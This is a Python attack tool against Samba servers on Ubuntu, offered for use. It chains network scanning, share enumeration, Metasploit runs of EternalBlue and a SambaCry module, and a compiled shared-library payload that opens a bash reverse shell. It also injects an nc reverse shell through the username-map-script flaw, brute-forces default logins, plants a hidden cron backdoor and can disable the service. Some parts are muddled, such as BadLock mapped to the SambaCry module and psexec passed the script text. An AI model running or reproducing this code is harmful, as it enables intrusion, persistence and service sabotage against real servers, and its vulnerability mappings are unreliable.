#!/usr/bin/env python3
"""
Ubuntu Samba Attack Script
--------------------------
This script targets Samba servers running on Ubuntu.

Usage:
    python3 samba_attack.py --target <IP> [--domain <domain>] [--user <username>] [--password <password>] [--disable]
    
    --target    : Target IP address
    --domain    : Domain name (optional)
    --user      : Username if known (optional)
    --password  : Password if known (optional)
    --disable   : Flag to disable the service rather than just compromise it
"""

import os
import sys
import argparse
import subprocess
import socket
import time
import random
import string
from datetime import datetime

class SambaAttack:
    def __init__(self, target, domain=None, username=None, password=None, disable=False):
        self.target = target
        self.domain = domain
        self.username = username
        self.password = password
        self.disable = disable
        self.compromised = False
        self.log_file = f"samba_attack_{target}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
        
    def log(self, message):
        """Log messages to console and file"""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        log_entry = f"[{timestamp}] {message}"
        print(log_entry)
        with open(self.log_file, "a") as f:
            f.write(log_entry + "\n")
            
    def check_dependencies(self):
        """Check and install required dependencies"""
        self.log("Checking dependencies...")
        dependencies = ["nmap", "smbclient", "enum4linux", "metasploit-framework", "hydra", "python3-impacket"]
        
        for dep in dependencies:
            try:
                subprocess.check_call(["dpkg", "-s", dep], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                self.log(f"✅ {dep} already installed")
            except subprocess.CalledProcessError:
                self.log(f"Installing {dep}...")
                try:
                    subprocess.check_call(["sudo", "apt-get", "update", "-qq"], stdout=subprocess.DEVNULL)
                    subprocess.check_call(["sudo", "apt-get", "install", "-y", dep], stdout=subprocess.DEVNULL)
                    self.log(f"✅ {dep} installed successfully")
                except subprocess.CalledProcessError:
                    self.log(f"❌ Failed to install {dep}")
                    return False
        return True
    
    def scan_samba_service(self):
        """Scan target for Samba service"""
        self.log(f"Scanning {self.target} for Samba service...")
        
        try:
            # Run nmap to identify Samba ports and version
            result = subprocess.check_output(
                ["nmap", "-sV", "-p", "139,445", self.target],
                universal_newlines=True
            )
            self.log("Scan results:")
            self.log(result)
            
            # Check if Samba is running
            if "139/tcp open" in result or "445/tcp open" in result:
                # Parse Samba version
                import re
                version_match = re.search(r"Samba\s+(\d+\.\d+\.\d+)", result)
                if version_match:
                    self.samba_version = version_match.group(1)
                    self.log(f"Detected Samba version: {self.samba_version}")
                else:
                    self.samba_version = "unknown"
                    self.log("Samba version could not be determined")
                
                return True
            else:
                self.log("❌ Samba service does not appear to be running")
                return False
                
        except subprocess.CalledProcessError:
            self.log("❌ Failed to scan target")
            return False
    
    def enum_samba_shares(self):
        """Enumerate Samba shares"""
        self.log("Enumerating Samba shares...")
        
        try:
            # Attempt anonymous listing
            result = subprocess.check_output(
                ["smbclient", "-L", self.target, "-N"],
                stderr=subprocess.STDOUT,
                universal_newlines=True
            )
            
            self.log("SMB Shares:")
            self.log(result)
            
            # Parse shares
            import re
            shares = re.findall(r"Disk\|([^\|]+)\|", result)
            if not shares:
                shares = []
                for line in result.splitlines():
                    if "Disk" in line and not "IPC$" in line:
                        parts = line.split()
                        if len(parts) >= 2:
                            shares.append(parts[0])
            
            self.shares = shares
            if shares:
                self.log(f"Found shares: {', '.join(shares)}")
                return True
            else:
                self.log("No accessible shares found anonymously")
                
            # More detailed enumeration with enum4linux
            self.log("Running detailed enumeration with enum4linux...")
            enum_result = subprocess.check_output(
                ["enum4linux", self.target],
                stderr=subprocess.STDOUT,
                universal_newlines=True
            )
            
            # Look for users
            users = re.findall(r"user:\[([^\]]+)\]", enum_result)
            if users:
                self.log(f"Found users: {', '.join(users)}")
                
            return True
            
        except subprocess.CalledProcessError as e:
            self.log(f"Enumeration error: {e.output}")
            return False
    
    def exploit_eternalblue(self):
        """Attempt to exploit MS17-010 EternalBlue vulnerability"""
        self.log("Attempting EternalBlue (MS17-010) exploitation...")
        
        # First, check if target is vulnerable
        try:
            result = subprocess.check_output(
                ["nmap", "--script", "smb-vuln-ms17-010", "-p", "445", self.target],
                universal_newlines=True
            )
            
            if "VULNERABLE" in result or "likely VULNERABLE" in result:
                self.log("✅ Target appears vulnerable to EternalBlue!")
                
                # Create Metasploit script
                msf_script = f"""use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS {self.target}
set LHOST {self.get_local_ip()}
set LPORT 4444
exploit -j
"""
                
                with open("/tmp/eternalblue.rc", "w") as f:
                    f.write(msf_script)
                
                self.log("Launching Metasploit exploit...")
                # This will be an interactive session, so we don't capture output
                subprocess.Popen(["msfconsole", "-r", "/tmp/eternalblue.rc"])
                
                self.compromised = True
                
                if self.disable:
                    self.log("To disable Samba service after gaining access:")
                    self.log("1. In meterpreter: shell")
                    self.log("2. Execute: systemctl mask smbd nmbd && chmod 000 /usr/sbin/smbd")
                
                return True
            else:
                self.log("❌ Target does not appear vulnerable to EternalBlue")
                
        except subprocess.CalledProcessError as e:
            self.log(f"EternalBlue check error: {str(e)}")
        
        return False
    
    def exploit_samba_rce(self):
        """Attempt to exploit Samba RCE vulnerabilities"""
        self.log("Checking for Samba RCE vulnerabilities...")
        
        # Check for CVE-2017-7494 (SambaCry)
        if hasattr(self, 'samba_version') and self.samba_version != "unknown":
            version_parts = self.samba_version.split('.')
            major = int(version_parts[0])
            minor = int(version_parts[1])
            
            # Check if version is vulnerable to SambaCry
            # Samba 3.x before 3.5.0 or 4.x before 4.6.4
            if (major == 3 and minor < 5) or (major == 4 and (minor < 6 or (minor == 6 and len(version_parts) > 2 and int(version_parts[2]) < 4))):
                self.log("Target may be vulnerable to SambaCry (CVE-2017-7494)")
                
                # Create a simple shared library payload
                payload_c = """
                #include <stdio.h>
                #include <stdlib.h>
                #include <unistd.h>
                
                void samba_init_module(void) {
                    system("id > /tmp/pwned");
                    if (fork() == 0) {
                        system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4445 0>&1'");
                    }
                }
                """
                
                # Replace with actual attacking machine IP
                payload_c = payload_c.replace("ATTACKER_IP", self.get_local_ip())
                
                # Save payload to file
                with open("/tmp/payload.c", "w") as f:
                    f.write(payload_c)
                
                # Compile the payload
                try:
                    subprocess.check_call([
                        "gcc", "-shared", "-fPIC", "-o", "/tmp/payload.so", "/tmp/payload.c"
                    ])
                    self.log("✅ Compiled payload successfully")
                except subprocess.CalledProcessError:
                    self.log("❌ Failed to compile payload")
                    return False
                
                # Start a listener
                listener_cmd = "nc -lvnp 4445"
                subprocess.Popen(listener_cmd.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                self.log("Started reverse shell listener on port 4445")
                
                # Attempt to find writeable shares
                if hasattr(self, 'shares'):
                    for share in self.shares:
                        try:
                            # Try to connect to share
                            connect_cmd = ["smbclient", f"//{self.target}/{share}", "-N"]
                            if self.username and self.password:
                                connect_cmd.extend(["-U", f"{self.username}%{self.password}"])
                            
                            p = subprocess.Popen(
                                connect_cmd,
                                stdin=subprocess.PIPE,
                                stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE,
                                universal_newlines=True
                            )
                            
                            # Upload payload
                            p.stdin.write("put /tmp/payload.so\n")
                            p.stdin.write("exit\n")
                            p.stdin.close()
                            p.wait()
                            
                            self.log(f"Uploaded payload to share: {share}")
                            
                            # Try to trigger the exploit
                            # Use path traversal to get to the correct location
                            for i in range(1, 10):  # Try different depths
                                path = "../" * i + "payload"
                                trigger_cmd = [
                                    "smbclient", f"//{self.target}/IPC$", "-N", 
                                    "-c", f"logon \"\";put /dev/null {path}.so;logoff"
                                ]
                                if self.username and self.password:
                                    trigger_cmd[3:3] = ["-U", f"{self.username}%{self.password}"]
                                
                                try:
                                    subprocess.check_call(trigger_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                                except:
                                    pass
                            
                            self.log("Attempted to trigger SambaCry exploit")
                            self.compromised = True
                            
                            if self.disable:
                                self.log("To disable Samba service after gaining shell:")
                                self.log("Execute: systemctl mask smbd nmbd && chmod 000 /usr/sbin/smbd")
                            
                            return True
                            
                        except Exception as e:
                            self.log(f"Error with share {share}: {str(e)}")
                
                self.log("❌ Could not exploit SambaCry vulnerability")
        
        # Try for BadLock vulnerability (CVE-2016-2118)
        self.log("Checking for BadLock vulnerability (CVE-2016-2118)...")
        try:
            result = subprocess.check_output(
                ["nmap", "--script", "smb-vuln-cve-2016-2118", "-p", "445", self.target],
                universal_newlines=True
            )
            
            if "VULNERABLE" in result:
                self.log("✅ Target appears vulnerable to BadLock!")
                
                # Create Metasploit script for BadLock
                msf_script = f"""use exploit/linux/samba/is_known_pipename
set RHOSTS {self.target}
set LHOST {self.get_local_ip()}
set LPORT 4446
exploit -j
"""
                
                with open("/tmp/badlock.rc", "w") as f:
                    f.write(msf_script)
                
                self.log("Launching Metasploit exploit for BadLock...")
                subprocess.Popen(["msfconsole", "-r", "/tmp/badlock.rc"])
                
                self.compromised = True
                
                if self.disable:
                    self.log("To disable Samba service after gaining access:")
                    self.log("1. In meterpreter: shell")
                    self.log("2. Execute: systemctl mask smbd nmbd && chmod 000 /usr/sbin/smbd")
                
                return True
            else:
                self.log("❌ Target does not appear vulnerable to BadLock")
                
        except subprocess.CalledProcessError:
            self.log("❌ Failed to check for BadLock vulnerability")
        
        return False
    
    def exploit_samba_username_map_script(self):
        """Attempt to exploit Samba username map script vulnerability (CVE-2007-2447)"""
        self.log("Checking for Samba 'username map script' vulnerability (CVE-2007-2447)...")
        
        # This vulnerability affects Samba 3.0.20 through 3.0.25rc3
        if hasattr(self, 'samba_version') and self.samba_version.startswith("3.0."):
            version_parts = self.samba_version.split('.')
            if len(version_parts) >= 3:
                subver = version_parts[2]
                if subver.isdigit() and 20 <= int(subver) <= 25:
                    self.log("✅ Target may be vulnerable to username map script RCE!")
                    
                    # Set up a netcat listener
                    listener_cmd = f"nc -lvnp 4447"
                    subprocess.Popen(listener_cmd.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    self.log("Started reverse shell listener on port 4447")
                    
                    # Exploit command - we'll inject a reverse shell
                    local_ip = self.get_local_ip()
                    exploit_cmd = f"smbclient '//{self.target}/tmp' -N -c 'logon \"/=`nohup nc {local_ip} 4447 -e /bin/bash`\"'"
                    
                    self.log("Executing exploit...")
                    subprocess.Popen(exploit_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    
                    time.sleep(3)  # Give it time to connect back
                    
                    self.log("If vulnerable, you should receive a shell connection")
                    self.compromised = True
                    
                    if self.disable:
                        self.log("To disable Samba service after gaining shell:")
                        self.log("Execute: systemctl mask smbd nmbd && chmod 000 /usr/sbin/smbd")
                    
                    return True
        
        self.log("❌ Target does not appear vulnerable to username map script RCE")
        return False
    
    def brute_force_smb(self):
        """Attempt to brute force SMB login"""
        if self.username and self.password:
            self.log(f"Already have credentials: {self.username}:{self.password}")
            return True
        
        self.log("Attempting to brute force SMB login...")
        
        # Common usernames and passwords
        usernames = ["administrator", "admin", "root", "samba", "user", "ubuntu"]
        passwords = ["password", "123456", "admin", "root", "samba", "ubuntu"]
        
        # Try NULL session first
        try:
            subprocess.check_call(
                ["smbclient", "-L", self.target, "-N"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            self.log("✅ NULL session (anonymous) login works")
            return True
        except:
            self.log("NULL session failed, trying credentials...")
        
        # Try each username/password combination
        for username in usernames:
            for password in passwords:
                try:
                    subprocess.check_call(
                        ["smbclient", "-L", self.target, "-U", f"{username}%{password}"],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL
                    )
                    self.log(f"✅ Found valid credentials: {username}:{password}")
                    self.username = username
                    self.password = password
                    return True
                except:
                    pass
        
        self.log("❌ Could not find valid SMB credentials")
        return False
    
    def get_local_ip(self):
        """Get the local IP address to receive connections"""
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            # This doesn't actually establish a connection
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
        except:
            local_ip = "127.0.0.1"  # Fallback
        finally:
            s.close()
        return local_ip
    
    def create_backdoor(self):
        """Create a backdoor if the target was compromised"""
        if not self.compromised:
            return False
        
        self.log("Attempting to create a backdoor...")
        local_ip = self.get_local_ip()
        
        # If we have credentials, try to use psexec
        if self.username and self.password:
            try:
                # Create a backdoor command
                backdoor_script = f"""#!/bin/bash
                mkdir -p /tmp/.hidden
                cat > /tmp/.hidden/backdoor.sh << 'EOF'
#!/bin/bash
while true; do
    nc {local_ip} 5555 -e /bin/bash || sleep 60
done
EOF
                chmod +x /tmp/.hidden/backdoor.sh
                
                # Add to crontab
                (crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/.hidden/backdoor.sh") | crontab -
                
                # Start the backdoor
                nohup /tmp/.hidden/backdoor.sh >/dev/null 2>&1 &
                """
                
                with open("/tmp/samba_backdoor.sh", "w") as f:
                    f.write(backdoor_script)
                    
                # Establish an SMB connection and try to execute the backdoor
                self.log("Attempting to deploy backdoor...")
                
                # Start listener on port 5555
                listener_cmd = "nc -lvnp 5555"
                subprocess.Popen(listener_cmd.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                
                # Try to use impacket's psexec to execute our backdoor
                subprocess.check_call([
                    "python3", "-m", "impacket.examples.psexec", 
                    f"{self.username}:{self.password}@{self.target}",
                    f"chmod +x {backdoor_script} && bash {backdoor_script}"
                ])
                
                self.log("✅ Backdoor deployment attempted")
                return True
                
            except Exception as e:
                self.log(f"❌ Failed to create backdoor: {str(e)}")
        
        return False
    
    def run(self):
        """Run the full attack sequence"""
        self.log(f"Starting attack on Samba server at {self.target}")
        
        if not self.check_dependencies():
            self.log("❌ Failed to install required dependencies")
            return False
        
        if not self.scan_samba_service():
            self.log("❌ Target does not have Samba service running")
            return False
        
        # Enumerate shares
        self.enum_samba_shares()
        
        # Try known exploits first
        if self.exploit_eternalblue():
            self.log("✅ Successfully exploited EternalBlue vulnerability")
        elif self.exploit_samba_rce():
            self.log("✅ Successfully exploited Samba RCE vulnerability")
        elif self.exploit_samba_username_map_script():
            self.log("✅ Successfully exploited username map script vulnerability")
        else:
            # If exploits failed, try brute force
            if self.brute_force_smb():
                self.log("✅ Successfully obtained valid credentials")
                self.compromised = True
                
                # Try to disable the service if requested
                if self.disable:
                    try:
                        # Try to use SSH with the same credentials
                        subprocess.check_call([
                            "sshpass", "-p", self.password,
                            "ssh", "-o", "StrictHostKeyChecking=no",
                            f"{self.username}@{self.target}",
                            "sudo systemctl mask smbd nmbd && sudo chmod 000 /usr/sbin/smbd"
                        ], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
                        self.log("✅ Samba service has been disabled")
                    except:
                        self.log("❌ Could not disable Samba service")
            else:
                self.log("❌ Could not compromise target")
                return False
        
        # Create backdoor if compromised
        if self.compromised:
            self.create_backdoor()
            self.log("✅ Attack completed successfully")
            return True
        else:
            self.log("❌ Failed to compromise target")
            return False

def main():
    parser = argparse.ArgumentParser(description="Samba Service Attack Tool")
    parser.add_argument("--target", required=True, help="Target IP address")
    parser.add_argument("--domain", help="Domain name (optional)")
    parser.add_argument("--user", help="Username if known (optional)")
    parser.add_argument("--password", help="Password if known (optional)")
    parser.add_argument("--disable", action="store_true", help="Disable service rather than just compromise")
    
    args = parser.parse_args()
    
    attack = SambaAttack(
        target=args.target,
        domain=args.domain,
        username=args.user,
        password=args.password,
        disable=args.disable
    )
    
    attack.run()

if __name__ == "__main__":
    main()
